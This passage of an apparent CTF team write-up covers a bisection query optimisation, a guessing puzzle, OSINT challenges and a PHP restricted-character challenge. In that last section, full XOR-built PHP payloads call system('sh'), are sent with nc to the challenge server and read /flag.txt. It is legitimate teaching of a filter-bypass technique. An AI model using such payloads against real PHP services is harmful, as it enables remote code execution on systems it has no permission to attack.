+$$0.09765625x+0.1953125(365-x)&lt;0.14(365) \Rightarrow x&gt;206.736$$</li>
+<li>We can set threshold $= 0.09765625$ for $207$ data points, and $0.1953125$ for $158$ data points (or $0.14$ and $0.28$, which will get the same result)</li>
+<li>Changes in code
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">threshold <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.14</span> <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">207</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0.28</span>
+<span style="color:#66d9ef">while</span> bounds[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span>bounds[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&gt;</span> threshold:
+    <span style="color:#f92672">...</span>
+</code></pre></div></li>
+<li>Result
+<ul>
+<li>Ran the code for 4 times, on average using 5353 requests to get the flag</li>
+<li>Can save ~260 requests</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Use even larger range threshold <em>(not 100% can solve)</em>
+<ul>
+<li>We are using a &ldquo;safe&rdquo; threshold to make sure <strong>EVERY</strong> data point to have error &lt; 0.07</li>
+<li>In fact, the error won&rsquo;t be exactly at the threshold for every data point</li>
+<li>For some data points, we will be luckier and have smaller error
+Then we can allow a larger room for error for the other data points (i.e. we can use even higher threshold in general)</li>
+<li>However, there will be a trade off between success rate and fewer requests</li>
+</ul>
+</li>
+</ol>
+<h3 id="niki-11-solves">Niki (11 solves)<a hidden class="anchor" aria-hidden="true" href="#niki-11-solves">#</a></h3>
+<p><em>Solved by fsharp, RaccoonNinja, TWY; write-up by RaccoonNinja</em></p>
+<p>A guessing misc challenge.</p>
+<p>The manual was in German so I used <a href="https://deepl.com">an online service</a> to translate it. After some trial-and-error with the procedures:</p>
+<p><img src="https://i.imgur.com/qICkvV2.png" alt="test outputs"></p>
+<p>We assumed with high confidence:</p>
+<ul>
+<li>Only the letter-named functions are changed (<code>change a few important letters</code>)</li>
+<li>All letters will be placed on the board (i.e. the flag can be read directly) and do not overlap</li>
+<li>The main procedure&rsquo;s <em>lines</em> but not their inner content are scrambled (the first line definitely won&rsquo;t work)</li>
+</ul>
+<p>There are only <code>tiek()dspo</code> left, as <code>zero</code> is not used in main.</p>
+<p>We did solve the puzzle with very aggressive guessing, but apparently there were multiple solutions.</p>
+<p><img src="https://i.imgur.com/bTrsZZY.png" alt="">
+<img src="https://i.imgur.com/vNzkWpn.png" alt=""></p>
+<p>Bruteforcing all the possible anagrams (6) was also a viable option.</p>
+<h3 id="phpfun-10-solves">PHPFu&hellip;n (10 solves)<a hidden class="anchor" aria-hidden="true" href="#phpfun-10-solves">#</a></h3>
+<p><em>Solved by ozetta, TWY; write-up by TWY</em></p>
+<p>In this challenge, we are only allowed to use <code>[(,.^')]</code> characters to execute arbitary PHP code.</p>
+<p>Due to the nature that the server reads the payload via <code>/bin/bash</code>, the length limit is thus restricted to 4096.</p>
+<p>Given that we have <code>'</code> characters to form strings, we can make use of PHP operator <code>^</code> (xor) on strings to obtain more characters to build the payload.</p>
+<p>By checking the ASCII values of the given characters (All within the range of <code>[0x28, 0x2f] ∪ [0x58, 0x5f]</code> with all lower bits available), it indicates that we can only produce characters in the range of <code>[0x00, 0x07] ∪ [0x28, 0x2f] ∪ [0x58, 0x5f] ∪ [0x70, 0x77]</code>.</p>
+<p>There is another trick in PHP that we can use the syntax <code>&quot;func_name&quot;(a, b)</code> to evaluate <code>funcname(a, b)</code>, which means we can call functions if the function name can be built using the provided characters.</p>
+<p>Running a simple check against <code>get_defined_functions()[&quot;internal&quot;]</code> reveals that there are only 3 function names satisfying the criteria: <code>sqrt</code>, <code>strstr</code>, and <code>strtr</code>.</p>
+<p>Notice that <a href="https://www.php.net/manual/en/function.sqrt.php"><code>sqrt</code></a> requires an integer (or a string comprising only digits), <a href="https://www.php.net/manual/en/function.strtr.php"><code>strtr</code></a> takes strings and outputs only a string with the characters already in the arguments (producing no new characters). Since we do not have usable digit at this point, we can only rely on the remaining function, <a href="https://www.php.net/manual/en/function.strstr.php"><code>strstr</code></a>. <code>strstr</code> can accept two strings as argument, and return a string if the 2nd argument is a substring of the 1st argument <!-- raw HTML omitted -->or <strong><code>false</code></strong> if not<!-- raw HTML omitted -->.</p>
+<p>Having <code>false</code> as return type means we can get a number <code>0</code> at this point by <code>false ^ false = 0</code>.</p>
+<p>Here is the note on generating the character 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># strings in double quote means they are generated are should be replaced by the corresponding code
+</span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>
+<span style="color:#e6db74">&#34;t&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>
+<span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>
+<span style="color:#e6db74">&#34;strstr&#34;</span><span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;s&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;t&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;r&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;s&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;t&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;r&#34;</span>)
+<span style="color:#66d9ef">false</span><span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;strstr&#34;</span>)(<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;,&#39;</span>)
+<span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">^</span><span style="color:#66d9ef">false</span>
+<span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">:</span> (<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#39;</span>
+</code></pre></div><p>As the ascii value of &lsquo;0&rsquo; is 0x30, which means now 64 characters can be generated:</p>
+<p><code>[0x00, 0x07] ∪ [0x18, 0x1f] ∪ [0x28, 0x37] ∪ [0x40, 0x47] ∪ [0x58, 0x5f] ∪ [0x68, 0x77]</code></p>
+<p>This includes digits from <code>0</code> to <code>7</code> and all letters (case insensitive) can be generated. Noticeably, letters <code>h</code> to <code>w</code> is in lower case and all others are in upper case. Importantly, <code>s</code> and <code>h</code> are both in lower case.</p>
+<p>At this point, we can already get the shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;.&#39;</span>
+<span style="color:#e6db74">&#34;E&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;0&#34;</span>
+<span style="color:#e6db74">&#34;h&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;(&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;0&#34;</span>
+<span style="color:#e6db74">&#34;m&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;]&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;0&#34;</span>
+<span style="color:#e6db74">&#34;sYstEm&#34;</span><span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;s&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;Y&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;s&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;t&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;E&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;m&#34;</span>)
+<span style="color:#e6db74">&#34;sh&#34;</span><span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;s&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;h&#34;</span>)
+<span style="color:#a6e22e">Get</span> <span style="color:#a6e22e">shell</span><span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;sYstEm&#34;</span>)(<span style="color:#e6db74">&#34;sh&#34;</span>)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Payload Length: 521</span>
+<span style="color:#f92672">(</span>echo <span style="color:#e6db74">&#34;((&#39;[&#39;^&#39;(&#39;).(&#39;[&#39;^&#39;,&#39;^&#39;.&#39;).(&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;[&#39;^&#39;.&#39;^(((&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;).(&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;))(&#39;&#39;,&#39;,&#39;)^((&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;).(&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;))(&#39;&#39;,&#39;,&#39;)).&#39;&#39;).(&#39;]&#39;^(((&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;).(&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;))(&#39;&#39;,&#39;,&#39;)^((&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;).(&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;))(&#39;&#39;,&#39;,&#39;)).&#39;&#39;))((&#39;[&#39;^&#39;(&#39;).(&#39;(&#39;^&#39;.&#39;^&#39;^&#39;^(((&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;).(&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;))(&#39;&#39;,&#39;,&#39;)^((&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;).(&#39;[&#39;^&#39;(&#39;).(&#39;)&#39;^&#39;]&#39;).(&#39;,&#39;^&#39;^&#39;))(&#39;&#39;,&#39;,&#39;)).&#39;&#39;))&#34;</span> <span style="color:#f92672">&amp;&amp;</span> cat<span style="color:#f92672">)</span> | nc phpfun.chal.idek.team <span style="color:#ae81ff">1337</span>
+Input script: bash <span style="color:#75715e"># switch to bash shell if needed</span>
+$ cat /flag.txt
+idek<span style="color:#f92672">{</span>N3w_v3rs1on_r3qu1re_new_t00lz!<span style="color:#f92672">}</span>
+</code></pre></div><p><strong>Extras:</strong></p>
+<p>We only have half of the standard ascii characters available. How about a short payload to create the remaining characters?</p>
+<p>(This is equivalent to creating just 1 more character not currently available)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#e6db74">&#34;q&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>
+<span style="color:#e6db74">&#34;6&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;(&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;0&#34;</span>
+<span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;(&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;0&#34;</span>
+<span style="color:#e6db74">&#34;sqrt&#34;</span><span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;s&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;q&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;r&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;t&#34;</span>)
+<span style="color:#e6db74">&#34;64&#34;</span><span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;6&#34;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#34;4&#34;</span>)
+<span style="color:#ae81ff">8</span><span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;sqrt&#34;</span>)(<span style="color:#e6db74">&#34;64&#34;</span>)
+<span style="color:#e6db74">&#34;8&#34;</span><span style="color:#f92672">:</span> (<span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#39;</span>
+</code></pre></div><div class="alert info">
+  <p>Post-mortem:
+There is a shorter payload for 0, which is illustrated by the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># original, length: 139
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">^</span><span style="color:#66d9ef">false</span>
+((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>))(<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;,&#39;</span>)<span style="color:#f92672">^</span>((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>))(<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;,&#39;</span>)
+<span style="color:#75715e"># replacement, length: 112
+</span><span style="color:#75715e"># notice that this is a float 0 instead of an integer 0
+</span><span style="color:#75715e"></span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;sqrt&#34;</span>)(<span style="color:#66d9ef">false</span>)
+((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>))(((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>))(<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;,&#39;</span>))
+
+<span style="color:#75715e"># Shortened Shell Payload - Length: 440
+</span><span style="color:#75715e"></span>((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;.&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">^</span>(((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>))(((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>))(<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;,&#39;</span>)))<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;]&#39;</span><span style="color:#f92672">^</span>(((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>))(((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>))(<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;,&#39;</span>)))<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#39;</span>))((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;(&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span><span style="color:#f92672">^</span>(((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>))(((<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;(&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;]&#39;</span>)<span style="color:#f92672">.</span>(<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#39;^&#39;</span>))(<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;,&#39;</span>)))<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#39;</span>))
+</code></pre></div>
+</div>
+  
+<p>By these, we can generate all available characters.</p>
+<h2 id="osint">Osint<a hidden class="anchor" aria-hidden="true" href="#osint">#</a></h2>
+<h3 id="osint-crime-confusion-series">Osint Crime Confusion Series<a hidden class="anchor" aria-hidden="true" href="#osint-crime-confusion-series">#</a></h3>
+<p><em>Solved by fsharp, Hollow, J4cky, LifeIsHard, RaccoonNinja, TWY</em></p>
+<h4 id="1-w-as-in-where-74-solves">1: W as in Where (74 solves)<a hidden class="anchor" aria-hidden="true" href="#1-w-as-in-where-74-solves">#</a></h4>
+<p>We found Dr. Jonathan Abigdail III in IG (a clue is that Abig<strong>d</strong>ail is very uncommon name)
+<img src="https://i.imgur.com/OEvdoxG.png" alt=""></p>
+<p>We check the post and found another user - Heather James from hashtag
+<img src="https://i.imgur.com/8cfhvqX.png" alt="">
+<img src="https://i.imgur.com/qwwqIoa.png" alt=""></p>
+<p>We know some information about Heather James</p>
+<blockquote>
+<p>study and Teached blue birds at the University of Dutch ThE of Topics in Science (UThE_TS)
+great_paintball_portugal competition
+ebay</p>
+</blockquote>
+<p>We found a user named great_paintball_portugal in ebay and a url: <a href="https://franparrefrancisco.wixsite.com/great-paintball-pt">https://franparrefrancisco.wixsite.com/great-paintball-pt</a>
+<img src="https://i.imgur.com/SYPc26S.png" alt=""></p>
+<p>Then, we check the post at <a href="https://franparrefrancisco.wixsite.com/great-paintball-pt/blog">https://franparrefrancisco.wixsite.com/great-paintball-pt/blog</a>
+<img src="https://i.imgur.com/7sDZcXd.png" alt=""></p>
+<p>Flag: <code>idek{TGPP_WCIYD}</code></p>
+<h4 id="2-w-as-in-weapon-50-solves">2: W as in Weapon (50 solves)<a hidden class="anchor" aria-hidden="true" href="#2-w-as-in-weapon-50-solves">#</a></h4>
+<p><code>It has something to do with a university of science.</code>
+We checked the university&rsquo;s twitter (<em>blue bird</em>) and found this
+<img src="https://i.imgur.com/G30CBpO.png" alt=""></p>
+<p>Then, we visit <a href="https://pads.ccc.de/ep/pad/view/ro.lvGC01KAJWI/rev.354">https://pads.ccc.de/ep/pad/view/ro.lvGC01KAJWI/rev.354</a>
+<img src="https://i.imgur.com/BIbL9qA.png" alt=""></p>
+<blockquote>
+<p>We do have a theory to what killed because something has been missing (
+HUBBLE SPACE TELESCOPE MODEL, BY PENWAL INDUSTRIES FOR NASA, CA 1990) ah shit delete delete</p>
+</blockquote>
+<p>Flag: <code>idek{HSTM_X!#$}</code></p>
+<h4 id="3-w-as-in-who-76-solves">3: W as in Who (76 solves)<a hidden class="anchor" aria-hidden="true" href="#3-w-as-in-who-76-solves">#</a></h4>
+<p>First, I found a name Alfaiate D&rsquo;interiores from the attached picture
+<img src="https://i.imgur.com/bUA32eB.jpg" alt=""></p>
+<p>After google the name, you can see the store&rsquo;s comments
+<img src="https://i.imgur.com/AAOPcKi.png" alt=""></p>
+<p>Found the email address: <a href="mailto:noodlesareramhackers@gmail.com">noodlesareramhackers@gmail.com</a></p>
+<p>I send an email and here is the reply.</p>
+<blockquote>
+<p>So&hellip; I got some stuff to tell you. I think the killer is probably watching us. The killer used a weird weapon as you have found out. Look, the info I have is that weirdly enough the university page of Heather tweeted something that might lead you to the killer. They deleted it though. Luckily these days you can just walk back in time! Ah, the tweet was 1612383535549059076. When you have the info look in github!
+Good Luck!</p>
+</blockquote>
+<p>So, check the deleted tweet at
+<a href="https://web.archive.org/web/20230109094239/https://twitter.com/UThE_TS/status/1612383535549059076/">https://web.archive.org/web/20230109094239/https://twitter.com/UThE_TS/status/1612383535549059076/</a></p>
+<blockquote>
+<p>Remember that weird student that wrote about potatoes eating camels? AHAHAH Maybe she is the killer</p>
+</blockquote>
+<p>We have some info now, so take a look at github and found the flag
+<a href="https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki">https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki</a>
+Flag: <code>idek{JULIANA_APOSIDM723489}</code></p>
+<h4 id="4-w-as-in-why-74-solves">4: W as in Why (74 solves)<a hidden class="anchor" aria-hidden="true" href="#4-w-as-in-why-74-solves">#</a></h4>
+<p>Use the keywords Johan Jørgen and sommerleker to google search. Then i find this.</p>
+<p><img src="https://i.imgur.com/T0AM3Uw.png" alt="">
+<img src="https://i.imgur.com/2oS55xC.png" alt=""></p>
+<p>It is the same as the picture attached.
+So,the flag is <code>idek{OLM-08741}</code></p>
+<h3 id="nmpz-54-solves">NMPZ (54 solves)<a hidden class="anchor" aria-hidden="true" href="#nmpz-54-solves">#</a></h3>
+<p><em>Solved by most members of the team collaborating; write-up by RaccoonNinja</em></p>
+<p>Usual clues in Geolocation:</p>
+<ul>
